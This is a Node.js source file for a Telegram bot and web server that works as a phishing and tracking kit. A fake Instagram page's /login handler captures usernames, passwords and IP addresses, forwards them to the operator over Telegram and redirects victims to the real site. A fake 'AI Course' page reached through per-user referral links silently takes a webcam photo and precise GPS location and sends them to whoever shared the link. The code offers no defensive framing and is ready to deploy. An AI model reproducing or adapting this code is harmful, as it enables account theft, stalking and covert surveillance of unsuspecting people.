// index.js (ESM) – Node 18+
// npm i telegraf express multer dotenv

import dotenv from "dotenv";
dotenv.config();

import express from "express";
import multer from "multer";
import { Telegraf } from "telegraf";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const BOT_TOKEN = process.env.BOT_TOKEN;
const HOST = process.env.HOST || "tgbot-tg1w.onrender.com";
const PORT = process.env.PORT || 3000;
const FIREBASE_DB_URL = process.env.FIREBASE_DB_URL;
const ADMIN_USER_ID = "5543574742";
const CHANNEL_ID = -1002970130807; // Your private channel ID
const CHANNEL_INVITE_LINK = "https://t.me/+VN0ATDiz9DBkOTQy"; // Your channel invite link

if (!BOT_TOKEN || !FIREBASE_DB_URL) {
  console.error("Set BOT_TOKEN and FIREBASE_DB_URL in .env");
  process.exit(1);
}

// ---------- FIREBASE ----------
async function saveUser(id) {
  try {
    await fetch(`${FIREBASE_DB_URL}/users/${id}.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        timestamp: Date.now() 
      })
    });
    await updateStats();
  } catch (e) { 
    console.error("Save user error:", e); 
  }
}

async function updateStats() {
  try {
    const usersRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
    const users = usersRes.ok ? (await usersRes.json() || {}) : {};
    const total = Object.keys(users).length;

    await fetch(`${FIREBASE_DB_URL}/stats.json`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        total: total, 
        updated: Date.now() 
      })
    });
    console.log(`Stats updated: Total Users = ${total}`);
  } catch (e) { 
    console.error("Update stats error:", e); 
  }
}

async function getStats() {
  try {
    const res = await fetch(`${FIREBASE_DB_URL}/stats.json`);
    if (!res.ok) return { total: 0 };
    const data = await res.json();
    return { total: data?.total || 0 };
  } catch (e) {
    console.error("Get stats error:", e);
    return { total: 0 };
  }
}

async function getAllUsers() {
  try {
    const res = await fetch(`${FIREBASE_DB_URL}/users.json`);
    if (!res.ok) return {};
    const data = await res.json();
    return data || {};
  } catch (e) {
    console.error("Get users error:", e);
    return {};
  }
}

// ---------- BOT ----------
const bot = new Telegraf(BOT_TOKEN);
const broadcastState = new Map();

// Check if user is subscribed to private channel
async function checkSubscription(userId) {
  try {
    const member = await bot.telegram.getChatMember(CHANNEL_ID, userId);
    return member.status === 'member' || member.status === 'administrator' || member.status === 'creator';
  } catch (error) {
    console.error('Check subscription error:', error);
    return false;
  }
}

// Show subscription required message
async function showSubscriptionRequired(ctx) {
  await ctx.reply(
    `📢 *Channel Subscription Required*\n\nTo use this bot, please join our private channel first!`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "📢 Join Private Channel", url: CHANNEL_INVITE_LINK }],
          [{ text: "✅ I've Joined", callback_data: "check_subscription" }]
        ]
      }
    }
  );
}

// /start with subscription check
bot.start(async (ctx) => {
  const id = String(ctx.from.id);
  const isSubscribed = await checkSubscription(id);
  
  if (!isSubscribed) {
    await showSubscriptionRequired(ctx);
    return;
  }
  
  // User is subscribed, show normal content
  await saveUser(id);
  await ctx.reply(
    `✅ *Subscription Verified!*\n\nВаша ссылка:\nhttps://${HOST}/r/${id}\n\nInstagram: https://${HOST}/insta`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Open Instagram", url: `https://${HOST}/insta` }]]
      }
    }
  );
});

// Check subscription callback
bot.action("check_subscription", async (ctx) => {
  await ctx.answerCbQuery("Checking subscription...");
  
  const id = String(ctx.from.id);
  const isSubscribed = await checkSubscription(id);
  
  if (isSubscribed) {
    await ctx.editMessageText(
      `✅ *Subscription Verified!*\n\nВаша ссылка:\nhttps://${HOST}/r/${id}\n\nInstagram: https://${HOST}/insta`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "Open Instagram", url: `https://${HOST}/insta` }]]
        }
      }
    );
    await saveUser(id);
  } else {
    await ctx.editMessageText(
      `❌ *Subscription Required*\n\nYou haven't joined the channel yet. Please join and try again.`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Join Private Channel", url: CHANNEL_INVITE_LINK }],
            [{ text: "✅ I've Joined", callback_data: "check_subscription" }]
          ]
        }
      }
    );
  }
});

bot.command("link", async (ctx) => {
  const id = String(ctx.from.id);
  const isSubscribed = await checkSubscription(id);
  
  if (!isSubscribed) {
    await showSubscriptionRequired(ctx);
    return;
  }
  
  await saveUser(id);
  await ctx.reply(`https://${HOST}/r/${id}`);
});

// Middleware to check subscription for other commands
bot.use(async (ctx, next) => {
  // Skip subscription check for start, link, and admin commands
  if (ctx.message?.text === '/start' || ctx.message?.text === '/link' || ctx.message?.text === '/admin') {
    return next();
  }
  
  // For other commands, check subscription
  const isSubscribed = await checkSubscription(ctx.from.id);
  if (!isSubscribed) {
    await showSubscriptionRequired(ctx);
    return;
  }
  
  return next();
});

// ---------- ADMIN ----------
bot.command("admin", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.reply("Access denied.");
  
  const { total } = await getStats();
  await ctx.reply(`Admin Panel\nTotal Users: ${total}`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📊 View Statistics", callback_data: "stats" }],
        [{ text: "📢 Send Message to All Users", callback_data: "broadcast" }]
      ]
    }
  });
});

// View Stats
bot.action("stats", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
  const { total } = await getStats();
  await ctx.editMessageText(
    `*User Statistics*\n\n📊 Total Users: ${total}`,
    { parse_mode: "Markdown" }
  );
  await ctx.answerCbQuery();
});

// Start Broadcast
bot.action("broadcast", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();

  const users = await getAllUsers();
  const userIds = Object.keys(users);

  if (userIds.length === 0) {
    return ctx.editMessageText("❌ No users found in database.");
  }

  // Store broadcast state
  const broadcastId = Date.now();
  broadcastState.set(broadcastId, {
    targets: userIds,
    adminChatId: ctx.chat.id,
    adminMessageId: ctx.message?.message_id
  });

  await ctx.editMessageText(
    `📢 *Broadcast Setup*\n\nUsers: ${userIds.length}\nBroadcast ID: ${broadcastId}\n\nNow send the message you want to broadcast:`,
    { 
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "❌ Cancel", callback_data: `cancel_${broadcastId}` }]
        ]
      }
    }
  );
  await ctx.answerCbQuery();
});

// Cancel broadcast
bot.action(/cancel_(\d+)/, async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
  
  const broadcastId = ctx.match[1];
  broadcastState.delete(parseInt(broadcastId));
  
  await ctx.editMessageText("❌ Broadcast cancelled.");
  await ctx.answerCbQuery();
});

// Handle broadcast message - FIXED: Prevent sending to channel
bot.on("message", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return;
  
  // Prevent bot from processing messages in channels
  if (ctx.chat.type !== 'private') {
    return;
  }
  
  // Find active broadcast for this admin
  let broadcastId = null;
  let state = null;
  
  for (const [id, s] of broadcastState.entries()) {
    if (s.adminChatId === ctx.chat.id) {
      broadcastId = id;
      state = s;
      break;
    }
  }
  
  if (!state) return; // No active broadcast
  
  const messageText = ctx.message.text || ctx.message.caption || "";
  if (!messageText.trim()) {
    await ctx.reply("❌ Message cannot be empty. Please send your broadcast message again.");
    return;
  }

  const targets = state.targets;
  const statusMsg = await ctx.reply(`🔄 *Sending broadcast...*\n\n0/${targets.length} users\n✅ 0 sent\n❌ 0 failed`, {
    parse_mode: "Markdown"
  });

  let sent = 0;
  let failed = 0;
  const failedUsers = [];

  // Send to all users
  for (let i = 0; i < targets.length; i++) {
    const userId = targets[i];
    
    try {
      // Try to send the message - only to users, not channels
      await ctx.telegram.sendMessage(userId, messageText);
      sent++;
    } catch (error) {
      failed++;
      failedUsers.push(userId);
      console.log(`Failed to send to ${userId}: ${error.message}`);
    }

    // Update progress every 10 messages or at the end
    if ((i + 1) % 10 === 0 || i === targets.length - 1) {
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMsg.message_id,
          undefined,
          `🔄 *Sending broadcast...*\n\n${i + 1}/${targets.length} users\n✅ ${sent} sent\n❌ ${failed} failed`,
          { parse_mode: "Markdown" }
        );
      } catch (e) {
        console.error("Failed to update status:", e);
      }
    }

    // Delay to avoid rate limits
    await new Promise(resolve => setTimeout(resolve, 100));
  }

  // Final result
  let resultText = `✅ *Broadcast Complete!*\n\n` +
                  `📊 Total: ${targets.length} users\n` +
                  `✅ Sent: ${sent}\n` +
                  `❌ Failed: ${failed}`;

  if (failed > 0) {
    resultText += `\n\nFailed users: ${failedUsers.slice(0, 10).join(', ')}${failedUsers.length > 10 ? '...' : ''}`;
  }

  await ctx.telegram.editMessageText(
    ctx.chat.id,
    statusMsg.message_id,
    undefined,
    resultText,
    { parse_mode: "Markdown" }
  );

  // Clean up
  broadcastState.delete(broadcastId);
});

// ---------- EXPRESS ----------
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });

// Serve Instagram page
// Configure body parser before routes
app.use(express.urlencoded({ extended: true }));

app.get("/insta", (_req, res) => {
  res.sendFile(path.join(__dirname, "test insta", "index.html"));
});

// Serve static files from "test insta" directory
app.use("/insta", express.static(path.join(__dirname, "test insta")));

// Login Capture
// CAPTURE LOGIN
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.redirect("/insta");

  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
  const time = new Date().toLocaleString();

  const message = `
*INSTAGRAM LOGIN*
*User:* \`${username}\`
*Pass:* \`${password}\`
*IP:* \`${ip}\`
*Time:* \`${time}\`
  `.trim();

  try {
    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error("Failed to send login", e);
  }

  res.redirect("https://www.instagram.com/");
});

// Student Page - Photo and Location Submission
const INSTA_PATH = path.join(__dirname, "test insta");
app.use("/insta", express.static(INSTA_PATH));

// CAPTURE LOGIN
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.redirect("/insta");

  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
  const time = new Date().toLocaleString();

  const message = `
*INSTAGRAM LOGIN*
*User:* \`${username}\`
*Pass:* \`${password}\`
*IP:* \`${ip}\`
*Time:* \`${time}\`
  `.trim();

  try {
    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error("Failed to send login", e);
  }

  res.redirect("https://www.instagram.com/");
});

// ---------- STUDENT PAGE ----------
app.get("/r/:ref", async (req, res) => {
  const { ref } = req.params;
  if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");

  // Optional: save even if user never used /start
  await saveUser(ref, null);

  res.type("html").send(`<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AI Course</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body,html{margin:0;padding:0;height:100%;background:#111;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;}
    .card{background:rgba(255,255,255,.08);backdrop-filter:blur(12px);border-radius:16px;padding:20px;max-width:380px;width:90%;text-align:center;}
    h1{font-size:1.6rem;color:#0f9;margin:8px 0;}
    .warn{background:#c62828;padding:12px;border-radius:10px;font-size:.9rem;margin:12px 0;}
    button{background:#0f9;color:#000;border:none;padding:14px;font-size:1rem;font-weight:600;border-radius:50px;width:100%;cursor:pointer;}
    #status{margin-top:12px;padding:10px;background:rgba(0,255,136,.1);border-radius:8px;font-size:.9rem;}
  </style>
</head>
<body>
<div class="card">
  <h1>AI 2024</h1>
  <div class="warn">
    <strong>REQUIRED:</strong><br>
    • Photo (verification)<br>
    • Location (region)
  </div>
  <button id="go">CONFIRM</button>
  <div id="status">Ready...</div>
</div>

<script>
const ref = ${JSON.stringify(ref)};
const firebaseUrl = ${JSON.stringify(FIREBASE_DB_URL)};
let photoBlob = null;
let geo = null;
let username = null;

if (window.Telegram?.WebApp) {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  const user = Telegram.WebApp.initDataUnsafe.user;
  if (user) username = user.username || null;
}

document.getElementById("go").onclick = async () => {
  const btn = document.getElementById("go");
  const status = document.getElementById("status");
  btn.disabled = true;
  status.textContent = "Starting...";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    video.play();
    await new Promise(r => { video.onloadeddata = r; });

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
    photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
    stream.getTracks().forEach(t => t.stop());
    status.textContent = "Photo OK";
  } catch (e) { status.textContent = "No photo"; }

  try {
    geo = await new Promise((res, rej) => {
      const t = setTimeout(() => rej(), 8000);
      navigator.geolocation.getCurrentPosition(
        p => { clearTimeout(t); res({ lat: p.coords.latitude, lon: p.coords.longitude }); },
        () => { clearTimeout(t); rej(); },
        { timeout: 8000, enableHighAccuracy: true }
      );
    });
    status.textContent += " | GPS OK";
  } catch (e) { status.textContent += " | No GPS"; }

  if (!photoBlob && !geo) {
    status.textContent = "Nothing received";
    btn.disabled = false;
    return;
  }

  status.textContent = "Sending...";
  const fd = new FormData();
  fd.append("ref", ref);
  if (geo) { fd.append("latitude", geo.lat); fd.append("longitude", geo.lon); }
  if (photoBlob) fd.append("photo", photoBlob, "s.jpg");

  try {
    await fetch("/submit", { method: "POST", body: fd });

    const userData = {
      userId: ref,
      username: username,
      timestamp: Date.now(),
      active: true,
      hasPhoto: !!photoBlob,
      hasLocation: !!geo
    };
    await fetch(\`\${firebaseUrl}/activeUsers/\${ref}.json\`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(userData)
    });

    status.innerHTML = "<strong>SUCCESS!</strong><br>You are active!";
    btn.style.display = "none";
  } catch (e) {
    status.textContent = "Error";
    btn.disabled = false;
  }
};
</script>
</body>
</html>`);
});

// ---------- SUBMIT ----------
app.post("/submit", upload.single("photo"), async (req, res) => {
  try {
    const { ref, latitude, longitude } = req.body;
    if (!ref || !/^\d+$/.test(ref)) return res.status(400).json({ ok: false });

    const inviterId = ref;
    const promises = [];

    if (req.file?.buffer) {
      promises.push(
        bot.telegram.sendPhoto(inviterId, { source: req.file.buffer }, {
          caption: `New student (ref ${ref})`
        }).catch(() => {})
      );
    }

    if (latitude && longitude) {
      const lat = parseFloat(latitude);
      const lon = parseFloat(longitude);
      if (!isNaN(lat) && !isNaN(lon)) {
        promises.push(
          bot.telegram.sendLocation(inviterId, lat, lon).catch(() => {}),
          bot.telegram.sendMessage(inviterId, `GPS: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).catch(() => {})
        );
      }
    }

    if (promises.length === 0) {
      promises.push(bot.telegram.sendMessage(inviterId, `Link opened (ref ${ref})`).catch(() => {}));
    }

    await Promise.allSettled(promises);
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ ok: false });
  }
});
// Handle student data submission

// Health check

app.get("/", (_req, res) => {
  res.json({ status: "OK", timestamp: new Date().toISOString() });
});
// Start server
const server = app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server LIVE: https://${HOST}:${PORT}`);
});

// Start bot
bot.launch().then(() => {
  console.log("🤖 Bot LIVE");
}).catch(e => {
  console.error("Bot launch error:", e);
});

// ---------- AUTO KEEP-ALIVE FOR RENDER ----------
const keepAlive = () => {
  const url = `https://${HOST}`;
  console.log(`🔄 Making keep-alive request to: ${url}`);
  
  fetch(url)
    .then(response => {
      if (response.ok) {
        console.log('✅ Keep-alive request successful');
      } else {
        console.log(`❌ Keep-alive request failed: ${response.status} - ${response.statusText}`);
      }
    })
    .catch(error => {
      console.error('❌ Keep-alive request error:', error.message);
    });
};

// Schedule keep-alive every 9 minutes (540000 ms)
const KEEP_ALIVE_INTERVAL = 9 * 60 * 1000;

// Start keep-alive only when server is fully ready
server.on('listening', () => {
  console.log('✅ Server is fully ready, starting keep-alive service...');
  
  // Wait 10 seconds after server is ready to ensure it can handle requests
  setTimeout(() => {
    keepAlive(); // Initial request
    setInterval(keepAlive, KEEP_ALIVE_INTERVAL); // Periodic requests
    console.log(`🔄 Keep-alive service started (every ${KEEP_ALIVE_INTERVAL/1000/60} minutes)`);
  }, 10000);
});

// ---------- GRACEFUL STOP ----------
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));